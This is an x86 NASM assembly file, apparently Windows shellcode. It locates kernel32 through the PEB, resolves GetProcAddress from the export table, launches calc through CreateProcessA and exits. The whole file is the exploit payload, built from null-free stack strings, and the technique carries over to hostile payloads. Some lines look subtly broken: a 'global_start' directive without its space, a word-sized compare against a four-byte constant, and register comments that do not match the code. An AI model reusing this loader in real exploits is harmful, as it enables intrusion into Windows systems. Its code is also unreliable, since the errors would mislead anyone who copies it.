global_start


section .text
_start: 

xor ecx, ecx
mul ecx
mov eax, [fs:ecx + 0x30] ; PEB offset
mov eax, [eax + 0xc]     ; LDR offset
mov esi, [eax + 0x14]    ; InMemOrderModList
lodsd                    ; 2nd module
xchg eax, esi            ; 
lodsd                    ; 3rd module
mov ebx, [eax + 0x10]    ; kernel32 base address
mov edi, [ebx + 0x3c]    ; e_lfanew offset
add edi, ebx             ; offset + base
mov edi, [edi + 0x78]    ; export table offset
add edi, ebx             ; offset + base
mov esi, [edi + 0x20]    ; namestable offset
add esi, ebx             ; offset + base
xor ecx, ecx             

Get_Function:
 
inc ecx                              ; Increment the ordinal
lodsd                                ; Get name offset
add eax, ebx                         ; Get function name
cmp dword [eax], 0x50746547          ; GetP
jnz Get_Function
cmp word [eax + 0xa], 0x73736572	   ; ress
jnz Get_Function
mov esi, [edi + 0x24]                ; ESI = Offset ordinals
add esi, ebx                         ; ESI = Ordinals table
mov cx, [esi + ecx * 2]              ; Number of function
dec ecx
mov esi, [edi + 0x1c]                ; Offset address table
add esi, ebx                         ; ESI = Address table
mov edi, [esi + ecx * 4]             ; EDi = Pointer(offset)
add edi, ebx                         ; EDi = GetProcAddress address

; use GetProcAddress to find CreateProcessA
xor ecx, ecx
push 0x61614173
sub word [esp + 0x2], 0x6161
push 0x7365636f
push 0x72506574
push 0x61657243
push esp
push ebx
call edi

; EAX = CreateProcessA address
; ECX = kernel32 base address
; EDX = kernel32 base address
; EBX = kernel32 base address
; ESP = "CreateProcessA.."
; ESI = ???
; EDI = GetProcAddress address

xor ecx, ecx
xor edx, edx
mov cl, 0xff

zero_loop:
push edx
loop zero_loop

push 0x636c6163                      ; "calc"
mov ecx, esp

push ecx
push ecx
push edx
push edx
push edx
push edx
push edx
push edx
push ecx
push edx
call eax

; EAX = 0x00000001
; ECX = some kernel32 address
; EDX = some stack Pointer
; EBX = kernel32 base
; EDI = GetProcAddress address

add esp, 0x10                   ; clean the stack
push 0x61737365
sub dword [esp + 0x3], 0x61    ; essa - a    
push 0x636f7250                ; Proc
push 0x74697845                ; Exit
push esp
push ebx
call edi

xor ecx, ecx
push ecx
call eax
